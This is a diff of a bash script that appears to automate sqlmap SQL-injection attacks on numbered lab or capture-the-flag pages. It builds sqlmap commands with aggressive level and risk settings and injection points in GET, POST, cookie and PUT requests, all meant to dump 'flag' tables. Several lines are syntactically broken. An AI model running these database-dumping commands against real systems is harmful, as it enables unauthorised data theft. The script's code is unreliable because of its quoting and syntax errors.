@@ -46,11 +46,11 @@
 #
 ###case 5
 #
-#sqlmap -u "http://$TGTHOST/case5.php?id=*" --dump --batch -t flag5 --no-cast --random-agent --level 5 --risk 3 --technique=BEU --dbms=MySQL --method=GET
+#sqlmap -u 'http://$TGTHOST/case5.php?id=*' --dump --batch -t flag5 --no-cast --random-agent --level 5 --risk 3 --technique=BEU --dbms=MySQL --method=GET
 #
 ###case 6
 #
-#sqlmap -u "http://$TGTHOST/case6.php?col=id" --dump --batch -t flag6 --random-agent --level 5 --risk 3 --dbms=MySQL --method=GET -v 3 --prefix="\`)"
+#sqlmap -u 'http://$TGTHOST/case6.php?col=id' --dump --batch -t flag6 --random-agent --level 5 --risk 3 --dbms=MySQL --method=GET -v 3 --prefix="\`)"
 ###case 7
 #
 ###case 8
@@ -65,17 +65,25 @@
 	#!/bin/bash
 
 	### Variables
-	#target host without protocol
 	TGTHOST=''
+	UINHOST=''
+	UINPROTO=''
+	OUTLOG=''
+	OUTFILE=''
+	SQMIN=''
 
 	#shorthand
 	OUTLOG='/home/'$USER'/.local/share/sqlmapout/'
 	OUTFILE=$(date +%s)'.txt'
-	SQMIN='sqlmap --batch --dump -D testdb --dbms=MySQL --random-agent -u '
+	SQMIN='sqlmap --batch --dump -D testdb --dbms=MySQL --random-agent -u '$TGTHOST
 
 	# Get target info from user
 	echo -n "Enter Target host, with port ':', without protocol: "
-	read TGTHOST
+	read UINHOST
+	echo -n "Enter Protocol (http or https) "
+	read UINPROTO
+	TGTHOST="$UINPROTO://$UINHOST"
+	TGTHOST="'$TGTHOST'"
 	echo -e "Target host set to" $TGTHOST
 
 	# check if sqlmap is installed
@@ -83,7 +91,7 @@
 
 	if [ $(dpkg-query -W -f='${Status}' sqlmap 2>/dev/null | grep -c "ok installed") -eq 0 ];
 	then
-	  echo -e "SQLmap not installed, installing now" && apt-get install sqlmap -y;
+	  echo -e "SQLmap not installed, trying to install now" && apt-get install sqlmap -y;
 	fi
 
 	# check if paths exists
@@ -93,38 +101,57 @@
 	  else (mkdir $OUTLOG && echo -e "making directory: " $OUTLOG);
 	fi
 
-	CS1=$SQMIN'http://'$TGTHOST'/case1.php?id=1*' -T flag1
+	#main commands
+	CS1=$SQMIN''$TGTHOST'/case1.php?id=1*' -T flag1
 	echo -e 'running case 1: ' $CS1
 	$CS1 >&1 > $OUTLOG$OUTFILE
 	cat $OUTLOG$OUTFILE | grep -i -E '(flag\d{1,2}\.csv)'
 	
-#	$CS2='http://'$TGTHOST'/case2.php' --compressed -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://$TGTHOST/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://$TGTHOST' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'id=1*' -T flag2
-#	echo -e 'running case 2: ' $CS2
-#	$CS2 >&1 > $OUTLOG$OUTFILE
-#	cat $OUTLOG$OUTFILE | grep -i -E 'flag\d{1,2}\.csv'
-#
-#	CS3=$SQLMIN'http://$TGTHOST/case3.php' -T flag3
-#	echo -e 'running case 3: ' $CS3
-#
-#
+	$CS2=$SQMIN''$TGTHOST'/case2.php' --compressed -X POST -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://$TGTHOST/case2.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://$TGTHOST' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Pragma: no-cache' -H 'Cache-Control: no-cache' --data-raw 'id=1*' -T flag2
+	echo -e 'running case 2: ' $CS2
+	$CS2 >&1 > $OUTLOG$OUTFILE
+	cat $OUTLOG$OUTFILE | grep -i -E 'flag\d{1,2}\.csv'
+
+	CS3=$SQMIN''$TGTHOST/case3.php' -T flag3 --cookie='id=1*' --method PUT
+	echo -e 'running case 3: ' $CS3
+	$CS3 >&1 > $OUTLOG$OUTFILE
+	cat $OUTLOG$OUTFILE | grep -i -E 'flag\d{1,2}\.csv'
+
+#	CS4=$SQMIN'$TGTHOST/case4.php' -T flag4
 #	echo -e 'running case 4: ' $CS4
-#	CS4=$SQLMIN'http://$TGTHOST/case4.php' -T flag3
 #
+#	CS5=$SQMIN'$TGTHOST/case5.php?id=*' -T flag5 --no-cast --level 5 --risk 3 --technique=BEU --method=GET
 #	echo -e 'running case 5: ' $CS5
-#	CS5=$SQLMIN'http://$TGTHOST/case5.php?id=*' -T flag5 --no-cast --level 5 --risk 3 --technique=BEU --method=GET
-
+#
+#	CS6=$SQLMIN'$TGTHOST/case6.php?col=id' -T flag6 --level 5 --risk 3 --method=GET -v 3 --prefix="\`)"
 #	echo -e 'running case 6: ' $CS6
-#	$SQLMIN'http://$TGTHOST/case6.php?col=id' -T flag6 --level 5 --risk 3 --method=GET -v 3 --prefix="\`)"
-
+#
+#	CS7=
 #	echo -e 'running case 7: ' $CS7
-
+#
+#	CS8=
 #	echo -e 'running case 8: ' $CS8
-
+#
+#	CS9=
 #	echo -e 'running case 9: ' $CS9
-
+#
+#	CS10=
 #	echo -e 'running case 10: ' $CS10
-
+#
+#	CS11=
 #	echo -e 'running case 11: ' $CS11
-
+#
 	echo -e 'outputting all logs to: ' $OUTLOG$OUTFILE
-	echo -e 'all flags at: ' 
+	echo -e 'all flags: ' 
+	echo -e 'flag1: '
+	echo -e 'flag2: '
+	echo -e 'flag3: '
+	echo -e 'flag4: '
+	echo -e 'flag5: '
+	echo -e 'flag6: '
+	echo -e 'flag7: '
+	echo -e 'flag8: '
+	echo -e 'flag9: '
+	echo -e 'flag10: '
+	echo -e 'flag11: '
+
